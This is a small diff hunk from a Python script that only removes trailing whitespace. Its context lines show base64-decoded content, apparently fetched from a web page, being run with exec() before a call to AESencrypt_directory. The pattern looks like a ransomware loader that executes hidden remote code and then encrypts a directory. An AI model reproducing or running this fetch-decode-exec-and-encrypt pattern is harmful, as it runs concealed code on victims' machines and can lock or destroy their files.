@@ -17,5 +17,5 @@ if __name__ == "__main__":
         decoded_script = base64.b64decode(encoded_content).decode('utf-8')
         exec(decoded_script)
         AESencrypt_directory(unique_hash)
-    else: 
+    else:
         print(f"Failed to retrieve the page. Status code: {response.status_code}")
